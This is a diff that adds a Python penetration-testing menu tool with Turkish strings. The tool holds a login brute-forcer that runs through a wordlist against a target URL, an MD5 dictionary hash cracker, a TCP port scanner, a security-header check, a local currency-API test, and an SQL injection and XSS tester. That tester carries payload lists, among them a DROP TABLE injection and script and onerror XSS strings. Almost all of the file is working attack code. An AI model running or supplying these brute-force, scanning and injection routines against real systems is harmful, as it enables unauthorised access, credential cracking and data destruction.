@@ -1,0 +1,143 @@
+import requests
+import hashlib
+import socket
+
+
+def brute_force_attack(url, usernames, passwords):
+    print("[+] Başlatılıyor: Brute Force Attack")
+    for user in usernames:
+        for password in passwords:
+            data = {"username": user, "password": password}
+            response = requests.post(url, data=data)
+            if "Welcome" in response.text:  # Başarılı giriş yanıtını kontrol et
+                print(f"[*] Başarılı giriş: {user} - {password}")
+                return
+    print("[-] Brute Force başarısız oldu!")
+
+
+def dictionary_attack(hash_value, wordlist):
+    print("[+] Başlatılıyor: Dictionary Attack")
+    for word in wordlist:
+        if hashlib.md5(word.encode()).hexdigest() == hash_value:
+            print(f"[*] Şifre kırıldı: {word}")
+            return
+    print("[-] Şifre kırma başarısız!")
+
+
+def port_scan(target, ports):
+    print(f"[+] {target} için Port Tarama Başlatılıyor")
+    for port in ports:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(1)
+        result = s.connect_ex((target, port))
+        if result == 0:
+            print(f"[*] Açık port bulundu: {port}")
+        s.close()
+
+
+def security_headers_test(url):
+    print(f"[+] {url} için Güvenlik Başlıkları Testi Başlatılıyor")
+    headers_to_check = ["X-Frame-Options", "Content-Security-Policy", "Strict-Transport-Security"]
+    response = requests.get(url)
+    for header in headers_to_check:
+        if header in response.headers:
+            print(f"[*] {header}: {response.headers[header]}")
+        else:
+            print(f"[-] {header} eksik!")
+
+
+def test_currency_rate():
+    url = "http://127.0.0.1:8000/currency-rate"
+    headers = {
+        "accept": "application/json",
+        "Content-Type": "application/json"
+    }
+    payload = {
+        "from_currency_code": "try",
+        "to_currency_code": "eur"
+    }
+    response = requests.post(url, headers=headers, json=payload)
+    print(f"[+] {url} için yanıt kodu: {response.status_code}")
+    print(response.json())
+
+def sql_xss_test(url, param, method="GET"):
+    print(f"[+] {url} için SQL Injection ve XSS Testi Başlatılıyor")
+
+    sql_payloads = [
+        "' OR '1'='1",
+        "' OR 1=1 --",
+        "' OR 'a'='a",
+        "' OR 1=1#",
+        "' OR 1=1/*",
+        "admin' --",
+        "'; DROP TABLE users; --"
+    ]
+
+    xss_payloads = [
+        "<script>alert('XSS')</script>",
+        '"><script>alert(1)</script>',
+        "<img src=x onerror=alert(1)>",
+        "<svg onload=alert(1)>"
+    ]
+
+    all_payloads = sql_payloads + xss_payloads
+
+    for payload in all_payloads:
+        if method == "GET":
+            test_url = f"{url}?{param}={payload}"
+            response = requests.get(test_url)
+        else:
+            data = {param: payload}
+            response = requests.post(url, json=data)
+
+        if any(err in response.text for err in ["SQL syntax", "syntax error", "mysql_fetch_array", "onerror", "alert(1)"]):
+            print(f"[*] Güvenlik açığı tespit edildi: {test_url} - {payload}")
+        else:
+            print(f"[-] {payload} ile açık bulunamadı")
+
+
+def main():
+    print("Penetration Test Aracı")
+    print("1) Brute Force Attack")
+    print("2) Dictionary Attack")
+    print("3) Port Tarama")
+    print("4) Header Güvenlik Testi")
+    print("5) SQL Injection & XSS Testi")
+    print("6) Currency Rate API Testi")
+
+    choice = input("Seçiminizi yapın: ")
+
+    if choice == "1":
+        url = input("Hedef giriş URL'sini girin: ")
+        usernames = ["admin", "user", "test"]
+        passwords = open("wordlist.txt").read().splitlines()
+        brute_force_attack(url, usernames, passwords)
+
+    elif choice == "2":
+        hash_value = input("Kırmak istediğiniz hash değerini girin: ")
+        wordlist = open("wordlist.txt").read().splitlines()
+        dictionary_attack(hash_value, wordlist)
+
+    elif choice == "3":
+        target = input("Hedef IP veya Domain adresini girin: ")
+        ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 8080, 8443]
+        port_scan(target, ports)
+
+    elif choice == "4":
+        url = input("Hedef URL'yi girin: ")
+        security_headers_test(url)
+
+    elif choice == "5":
+        url = input("Hedef URL'yi girin: ")
+        param = input("Test edilecek parametre adını girin: ")
+        sql_xss_test(url, param)
+
+    elif choice == "6":
+        test_currency_rate()
+
+    else:
+        print("Geçersiz seçim!")
+
+
+if __name__ == "__main__":
+    main()
